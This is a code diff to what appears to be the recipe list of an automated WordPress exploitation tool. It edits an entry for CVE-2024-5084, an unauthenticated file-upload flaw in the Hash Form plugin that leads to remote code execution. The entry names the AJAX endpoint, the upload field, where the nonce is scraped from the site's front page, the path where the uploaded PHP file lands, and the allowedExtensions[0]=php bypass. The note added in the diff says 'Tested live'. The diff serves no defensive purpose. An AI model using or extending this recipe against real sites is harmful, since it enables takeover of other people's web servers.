@@ -287,16 +287,14 @@ RECIPES = [
         "endpoint": "/wp-admin/admin-ajax.php",
         "params": {"action": "hashform_file_upload_action"},
         "field": "qqfile",
+        "nonce_from": {"url": "/", "key": "ajax_nounce", "param": "file_uploader_nonce"},
         "upload_path": "/wp-content/uploads/hashform/temp/{filename}",
-        "payload_type": "file-upload-extension-bypass",
         "source": "registry",
         "note": "Unauth arbitrary file upload RCE (CVE-2024-5084, Hash Form <=1.1.0): "
-                "file_upload_action() accepts allowedExtensions from user input without "
-                "validation. Sending allowedExtensions[0]=php bypasses all extension "
-                "validation. Nonce is publicly visible in hashform_vars JS object and "
-                "valid for all users (not session-tied). No auth required. Plugin abandoned. "
-                "CVSS 10.0 (perfect score). GitHub PoCs: WOOOOONG/CVE-2024-5084, "
-                "KTN1990/CVE-2024-5084, Metasploit module available.",
+                "FineUploader file_upload_action() accepts allowedExtensions from user input "
+                "without validation. Sending allowedExtensions[0]=php bypasses extension checks. "
+                "Nonce is publicly visible in hashform_vars JS object. No auth required. "
+                "CVSS 10.0. Tested live.",
     },
     {
         "plugin": "wp-file-upload",
